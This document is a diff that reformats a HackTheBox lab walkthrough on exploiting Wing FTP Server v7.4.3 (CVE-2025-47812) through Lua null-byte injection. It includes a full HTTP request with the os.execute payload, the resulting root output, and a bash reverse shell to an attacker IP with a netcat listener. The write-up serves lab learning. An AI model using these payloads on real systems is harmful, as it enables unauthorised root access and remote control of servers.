@@ -1,85 +1,117 @@
-================================================================================
-SECTION 1: TARGET OVERVIEW - WINGDATA
-================================================================================
-Target IP: 10.10.11.xxx (HTB Lab)
-Service: Wing FTP Server v7.4.3
-Objective: Gain Remote Code Execution (RCE) via administrative console.
+# WingData — HackTheBox Lab Walkthrough
 
-[VULNERABILITY ANALYSIS]
-The version v7.4.3 is vulnerable to CVE-2025-47812. The vulnerability stems from 
-insufficient sanitization of inputs passed to the Lua interpreter used by the 
-Web Administration interface. By utilizing a null-byte injection, we can bypass 
-administrative security filters to execute arbitrary Lua code on the host system.
+**Target:** `10.10.11.xxx`  
+**Service:** Wing FTP Server v7.4.3  
+**Objective:** Gain Remote Code Execution (RCE) via administrative console
 
-================================================================================
-SECTION 2: ENUMERATION & DISCOVERY
-================================================================================
-1. Initial Service Identification:
-   Command: $ nmap -sV -p 80,443,21,22 <TARGET_IP>
-   Finding: Port 80/443 revealed 'Wing FTP Server/7.4.3'.
+---
 
-2. Port Mapping & Web Recon:
-   - Accessing the web interface revealed a login page for 'Wing FTP Server'.
-   - Attempted common credentials (admin/admin, root/root) - FAILED.
+## :warning: Vulnerability Analysis
 
-================================================================================
-SECTION 3: EXPLOITATION VIA BURP SUITE
-================================================================================
-The exploitation phase required intercepting the login request to modify the 
-parameters being sent to the internal Lua engine.
+- **CVE:** [`CVE-2025-47812`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47812)
+- **Summary:**  
+  Wing FTP Server v7.4.3 suffers from insufficient sanitization of user input passed to the Lua interpreter in its Web Administration interface. Attackers can use null-byte injection to bypass admin security filters and execute arbitrary Lua code on the host.
 
-1. Intercepting the Request:
-   - Open Burp Suite and set Intercept to ON.
-   - Enter dummy credentials in the login page.
-   - Capture the POST request to '/admin_login.html'.
+---
 
-2. The Lua Payload Injection:
-   Inside the Burp Suite Repeater, we modified the parameters to include Lua 
-   commands. The server uses Lua for automation and administrative tasks.
+## :mag: Enumeration & Discovery
 
-   Payload (Remote Code Execution):
-   The following command was injected into the vulnerable parameter:
-   
-   os.execute("id")
+1. **Initial Service Identification**
 
-3. Full Burp Suite Request Context:
-   POST /admin_login.html HTTP/1.1
-   Host: wingdata.htb
-   Content-Type: application/x-www-form-urlencoded
+   ```bash
+   nmap -sV -p 80,443,21,22 <TARGET_IP>
+   ```
 
-   username=admin&password=admin&command=os.execute("id")%00
+   - **Result:**  
+     Ports 80/443 revealed:  
+     ```
+     Wing FTP Server/7.4.3
+     ```
 
-   [NOTE]: The '%00' (Null-byte) was used to terminate the string and bypass 
-   internal validation checks that were looking for specific file extensions 
-   or command endings.
+2. **Port Mapping & Web Recon**
 
-4. Verifying the Shell:
-   The server's response included the output of the 'id' command:
-   uid=0(root) gid=0(root) groups=0(root)
-   
-   This confirmed we had achieved RCE as the ROOT user.
+   - Navigated to the web interface and found a login page for Wing FTP Server.
+   - Attempted default/common creds:
 
-================================================================================
-SECTION 4: POST-EXPLOITATION COMMANDS
-================================================================================
-To stabilize the access, we utilized a Lua reverse shell payload:
+     ```bash
+     admin/admin
+     root/root
+     ```
+     _Both failed._
 
-1. Reverse Shell Command:
-   os.execute("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.xx/4444 0>&1'")
+---
 
-2. Netcat Listener:
-   On our local machine:
-   $ nc -lvnp 4444
+## :rotating_light: Exploitation (Burp Suite)
 
-================================================================================
-SECTION 5: FAILURES & LESSONS LEARNED
-================================================================================
-- FAILURE: Initial attempts to use simple shell commands failed because the 
-  server required the commands to be wrapped in the Lua 'os.execute()' function.
-- FAILURE: Payloads were initially blocked by the WAF until the Null-byte (%00) 
-  injection was applied to break the input sanitization logic.
-- SUCCESS: Understanding that Wing FTP is built on a Lua backend was the 
-  turning point for this machine.
+The exploitation targeted the login POST request parameters sent to the internal Lua engine.
 
-================================================================================
-[LOG END - WINGDATA REPORT]
+### 1. Intercepting the Request
+
+- Open Burp Suite (Intercept: ON)
+- Enter dummy credentials on login page.
+- Capture the POST request to:
+
+  ```
+  /admin_login.html
+  ```
+
+### 2. Crafting Payload (Lua Injection)
+
+- Inside Burp's Repeater, modify request parameters:
+
+  ```http
+  POST /admin_login.html HTTP/1.1
+  Host: wingdata.htb
+  Content-Type: application/x-www-form-urlencoded
+
+  username=admin&password=admin&command=os.execute("id")%00
+  ```
+
+  _**Note:** The `%00` null byte terminates the string, bypassing input filters checking for file extensions or specific input patterns._
+
+### 3. Verification (RCE)
+
+Server response includes the result of the payload:
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Root RCE confirmed!**
+
+---
+
+## :rocket: Post-Exploitation
+
+### 1. Reverse Shell Command
+
+Deliver a reverse shell using Lua:
+```lua
+os.execute("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.xx/4444 0>&1'")
+```
+
+### 2. Netcat Listener
+
+On your attacker machine:
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## :no_entry_sign: Failures & Lessons Learned
+
+- ❌ Initial shell commands failed—Wing FTP required code in a Lua `os.execute()` function.
+- ❌ WAF blocked basic payloads. Success only after using null-byte injection (`%00`) to circumvent sanitization.
+- :bulb: Realization that Wing FTP is Lua-based enabled tailored exploitation.
+
+---
+
+## Reference
+
+- CVE: [`CVE-2025-47812`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47812)
+- [Wing FTP Server — Official Site](https://www.wftpserver.com/)
+
+---
+
+<sub>HTB Lab Writeup — by PicasoTheDeal</sub>
